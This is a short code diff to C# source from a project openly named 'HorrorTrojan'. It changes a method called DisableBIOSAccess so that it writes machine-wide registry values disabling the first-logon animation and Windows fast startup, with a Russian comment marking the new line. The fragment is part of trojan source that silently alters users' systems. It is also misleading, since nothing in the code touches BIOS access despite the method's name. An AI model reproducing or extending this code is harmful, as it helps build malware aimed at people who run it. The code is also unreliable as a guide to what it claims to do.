@@ -146,9 +146,12 @@ namespace HorrorTrojan
         }
         
         private static void DisableBIOSAccess()
-        {
-            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
-                key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
+{
+    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
+        key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
+        
+    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
+        key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);  // ← НЕТ в старой!
         }
     }
 }
